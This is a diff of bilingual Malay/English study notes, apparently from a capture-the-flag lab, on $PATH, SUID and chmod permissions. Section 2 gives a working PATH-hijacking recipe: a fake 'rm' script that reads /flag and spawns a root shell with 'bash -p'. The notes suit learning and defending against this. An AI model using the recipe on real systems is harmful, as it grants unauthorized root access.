@@ -1,103 +1,99 @@
-# `$PATH` Hijacking, SUID & File Permissions — Quick Notes
+# `$PATH` Hijacking, SUID & File Permissions — Notes
 
-## 1. Memahami `$PATH` & Cara Linux Cari Command
-Setiap command seperti `ls`, `cat`, atau `rm` sebenarnya ialah compiled binary program yang duduk dalam folder seperti `/usr/bin/` atau `/bin/`.
+## 1. `$PATH` & Camne Linux Cari Command
+Commands like `ls`, `cat`, `rm` tu sebenarnya compiled binaries yang duduk dalam folders macam `/usr/bin/` atau `/bin/`.
 
-* **`$PATH`**: List folder (dipisahkan dengan `:`) yang `bash` search dari **kiri ke kanan** bila kita taip bare command tanpa full path.
-* **Explicit / Full Path:** Kalau program panggil full path (cth: `/usr/bin/rm`), Linux **tak akan** tengok `$PATH` langsung.
+* **`$PATH`**: List of folders (separated by `:`) yang bash search dari **kiri ke kanan** bila kita type bare command tanpa full path.
+* Kalau guna full path (cth: `/usr/bin/rm`), Linux langsung ignore `$PATH`.
 
 ```bash
-which ls                  # Check lokasi sebenar program ls (cth: /usr/bin/ls)
-echo $PATH                # Print senarai folder dalam $PATH
+which ls                  # check lokasi sebenar binary ls
+echo $PATH                # tengok isi $PATH sekarang
 
-PATH=""                   # Kosongkan $PATH (dalam current shell sahaja)
-export PATH=""            # Kosongkan $PATH termasuk untuk child process
-PATH=~/bin:$PATH          # Selit folder ~/bin di PALING DEPAN $PATH tanpa buang yang lama
+PATH=""                   # kosongkan $PATH (current shell je)
+export PATH=""            # kosongkan $PATH termasuk child processes
+PATH=~/bin:$PATH          # selit ~/bin kat depan $PATH tanpa buang yang lama
 ```
-*(Note: Jangan letak space dekat tanda `=` masa set variable dalam Bash!)*
+*(Jangan letak space dekat `=` masa set variable dalam bash!)*
 
 ---
 
-## 2. *PATH Hijacking* Attack (Rampas Command Program SUID)
-Bila program berkuasa `root` (SUID) panggil external command **tanpa full path** (cth: `rm` sahaja, bukan `/usr/bin/rm`) dan tak sanitize `$PATH`, normal user boleh tipu `root` untuk run fake script kita.
+## 2. PATH Hijacking Attack
+Bila SUID program call command **tanpa full path** (cth: `rm` je, bukan `/usr/bin/rm`) dan tak sanitize `$PATH`, kita boleh trick dia run fake script kita instead.
 
-### Attack Flow (4 Steps)
-1. **Create custom command folder sendiri:**
+### Attack Flow
+1. Buat folder untuk fake command:
    ```bash
    mkdir -p ~/bin
    ```
-2. **Tulis fake script guna nama target command (cth: `rm`):**
+2. Tulis fake script guna nama command yang sama (cth: `rm`):
    ```bash
-   # -e enable escape sequence supaya \n dibaca sebagai newline
+   # -e enable escape sequences supaya \n jadi newline
    echo -e '#!/bin/bash\n/usr/bin/cat /flag\n/bin/bash -p' > ~/bin/rm
    ```
-3. **Tambah *Execute* (`+x`) permission supaya Linux recognize sebagai program:**
+3. Bagi execute permission:
    ```bash
    chmod +x ~/bin/rm
    ```
-4. **Letak `~/bin` di depan `$PATH` dan run SUID target program:**
+4. Letak `~/bin` depan `$PATH` pastu run SUID program:
    ```bash
    PATH=~/bin:$PATH /challenge/run
    ```
-   *(Sebab child process inherit identity parent process, script `~/bin/rm` kita akan run dengan full kuasa **`root`**!)*
+   *(Child process inherit parent identity — `~/bin/rm` kita run dengan kuasa `root`!)*
 
 ---
 
-## 3. Bedah 7 Kolum `ls -l`
-Contoh output:
+## 3. Breakdown 7 Columns `ls -l`
 ```text
 -rwsr-xr-x   1    root      root      16384 Nov 19 07:33 run
   (1)       (2)    (3)       (4)        (5)        (6)      (7)
 ```
 
-| Kolum | Nama | Maksud |
+| Column | Name | Maksud |
 | :--- | :--- | :--- |
-| **(1)** | **Type & Permissions** | Huruf 1 = file type (`-` file, `d` directory, `l` symlink, `p` FIFO pipe). Diikuti 3 set `rwx` untuk **Owner**, **Group**, dan **Others**. |
-| **(2)** | **Hard Link Count** | Jumlah hard links yang point ke data file tu (`1` untuk normal file, `2+` untuk folder). |
-| **(3)** | **Owner** | Pemilik individu file (tentukan kuasa siapa dipakai kalau SUID bit aktif). |
-| **(4)** | **Group** | Kumpulan pemilik file (share access antara ahli group yang sama). |
-| **(5)** | **Size** | Saiz file dalam *bytes*. |
-| **(6)** | **Timestamp** | Tarikh dan masa terakhir file modified. |
-| **(7)** | **Filename** | Nama file atau directory. |
+| **(1)** | Type & Permissions | Huruf 1 = jenis (`-` file, `d` dir, `l` symlink, `p` FIFO). Lepas tu 3 set `rwx` untuk Owner / Group / Others. |
+| **(2)** | Hard Link Count | Berapa hard links yang point ke data ni. |
+| **(3)** | Owner | Pemilik file — kuasa dia yang dipakai kalau SUID aktif. |
+| **(4)** | Group | Group pemilik file. |
+| **(5)** | Size | Saiz dalam bytes. |
+| **(6)** | Timestamp | Tarikh last modified. |
+| **(7)** | Filename | Nama file. |
 
 ---
 
-## 4. SUID (`s`) & Flag `bash -p`
-* **SUID (*Set User ID* — `-rwsr-xr-x`):** Huruf `s` gantikan `x` di slot *Owner*. Ia allow normal user run program tu dengan **pinjam identity/kuasa *Owner* asal file** (cth: `root`), bukan identity user yang run.
-* **Kernel Protection:** Kalau isi SUID file di-modify (`write`), Linux kernel akan auto-drop bit `s` untuk security.
-* **Kenapa Wajib Guna `/bin/bash -p`:** Secara default, `bash` akan drop inherited `root` privilege kalau real UID tak sama dengan effective UID. Flag **`-p` (*Privileged Mode*)** paksa `bash` kekalkan identity `root` (`EUID 0`) sampai buka interactive *root shell* (`#`).
+## 4. SUID & `bash -p`
+* **SUID (`-rwsr-xr-x`):** `s` gantikan `x` kat slot Owner. Normal user boleh run program guna kuasa owner asal (cth: `root`).
+* **Kernel protection:** Kalau SUID file di-modify, kernel auto-drop bit `s`.
+* **`bash -p`:** Default bash akan drop `root` privilege kalau real UID ≠ effective UID. Flag `-p` paksa bash kekalkan kuasa `root` — open root shell (`#`).
 
 ---
 
-## 5. `chmod` — Tukar File Permissions (Symbolic vs Octal)
+## 5. `chmod` — Change Permissions
 
-### Basic Permission Values
-* **`r` (*Read*)** = **`4`**
-* **`w` (*Write*)** = **`2`**
-* **`x` (*Execute*)** = **`1`**
-* **`-` (*No Access*)** = **`0`**
+### Permission Values
+* `r` = `4`, `w` = `2`, `x` = `1`, `-` = `0`
 
-### Cara 1: Symbolic Style (`u`, `g`, `o`, `+`, `-`, `=`)
-* `u` = User (Owner), `g` = Group, `o` = Others, `a` = All
+### Symbolic Style
+* `u` = Owner, `g` = Group, `o` = Others, `a` = All
 
 ```bash
-chmod +x ~/bin/rm          # Tambah execute (x) permission untuk semua
-chmod u=r,go= flag         # Owner boleh read sahaja (r), Group & Others dibuang semua access
-chmod u=rw,go= flag        # Owner boleh read & write (rw), Group & Others dibuang semua access
+chmod +x ~/bin/rm          # tambah execute untuk semua
+chmod u=r,go= flag         # owner: read je; group & others: no access
+chmod u=rw,go= flag        # owner: read+write; group & others: no access
 ```
 
-### Cara 2: Octal Number Style (3 Digit: `Owner` `Group` `Others`)
-Campur nilai `4` (`r`), `2` (`w`), dan `1` (`x`) untuk setiap group:
+### Octal Style (3 digits: Owner Group Others)
+Tambah values untuk dapat digit — contoh: `rwx` = 4+2+1 = `7`
 
-| Code | Pecahan | Output `ls -l` | Kegunaan Biasa |
+| Code | Breakdown | `ls -l` | Common Use |
 | :--- | :--- | :--- | :--- |
-| **`755`** | `7` (`4+2+1`), `5` (`4+1`), `5` (`4+1`) | `-rwxr-xr-x` | Program / script yang semua orang boleh run. |
-| **`700`** | `7` (`4+2+1`), `0`, `0` | `-rwx------` | Private program / script untuk owner sahaja. |
-| **`644`** | `6` (`4+2`), `4`, `4` | `-rw-r--r--` | Normal text file (owner boleh edit, orang lain read-only). |
-| **`600`** | `6` (`4+2`), `0`, `0` | `-rw-------` | Secret file (hanya owner boleh read & edit). |
-| **`400`** | `4`, `0`, `0` | `-r--------` | File `/flag` (hanya `root` boleh read; normal user kena `Permission denied`). |
+| `755` | 7, 5, 5 | `-rwxr-xr-x` | Program yang semua orang boleh run |
+| `700` | 7, 0, 0 | `-rwx------` | Private program, owner je |
+| `644` | 6, 4, 4 | `-rw-r--r--` | Normal text file |
+| `600` | 6, 0, 0 | `-rw-------` | Secret file, owner je |
+| `400` | 4, 0, 0 | `-r--------` | Read-only, root je |
 
 ```bash
-chmod 755 ~/bin/rm         # Sama je macam chmod +x ~/bin/rm
-chmod 400 flag             # Lock file supaya owner (root) sahaja boleh baca
+chmod 755 ~/bin/rm         # sama macam chmod +x
+chmod 400 flag             # lock — root je boleh baca
 ```
